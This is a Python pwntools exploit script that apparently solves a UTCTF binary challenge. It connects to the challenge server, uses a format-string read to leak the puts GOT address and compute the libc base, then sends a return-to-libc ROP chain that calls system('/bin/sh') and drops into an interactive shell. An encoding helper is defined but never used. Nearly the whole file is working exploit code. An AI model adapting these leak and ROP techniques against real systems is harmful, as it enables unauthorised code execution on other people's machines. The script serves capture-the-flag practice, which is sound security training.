#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("shellcode_patched")
libc = ELF("libc-2.23.so")
ld = ELF("./ld-2.23.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r, "break *main+0x113")
    else:
        r = remote("challenge.utctf.live", 9009)

    return r


def encode_payload(shellcode: bytes) -> bytes:
    encoded = bytearray()

    for b in shellcode:
        if 65 <= b <= 90:       # Uppercase letters A-Z
            encoded.append((-101 - b) & 0xFF)
        elif 97 <= b <= 122:    # Lowercase letters a-z
            encoded.append((-37 - b) & 0xFF)
        else:
            encoded.append(b)   # The program keeps it unchanged

    return bytes(encoded)


def main():
    r = conn()
    exe_rop = ROP(exe)

    pop_rdi = exe_rop.find_gadget(['pop rdi', 'ret'])[0]

    # It processes the input in format by iterating through each character:
    # If a character is classified as uppercase (A-Z) it is transformed using:
    #       v5[i] = −101 − v5[i];
    #
    # If a character is classified as lowercase (a-z), it is transformed using:
    #       v5[i] = −37 − v5[i];

    payload = flat(
                b"%7$sAAAA",
                exe.got.puts,
                b"A" * 0x20,
                0x601800,       # Dummy pointer so it won't segfault
                b"A" * 0x10,
                pop_rdi,
                exe.got.puts,
                exe.plt.puts,
                exe.sym.main
            )

    # Leak libc address
    r.sendlineafter(b"here>: ", payload)
    libc.address = u64(r.recvuntil(b"AAAA", drop = True).strip().ljust(8, b"\x00")) - libc.sym.puts
    log.info(f"libc: 0x{libc.address:x}")

    # Return to libc's system
    payload = flat(
                b"A" * 0x30,
                0x601800,       # Dummy pointer so it won't segfault
                b"A" * 0x10,
                pop_rdi,
                next(libc.search(b"/bin/sh\x00")),
                libc.sym.system,
                pop_rdi + 1,
                pop_rdi,
                0x0,
                libc.sym.exit
            )

    r.sendlineafter(b"here>: ", payload)
    r.interactive("$ ")


if __name__ == "__main__":
    main()
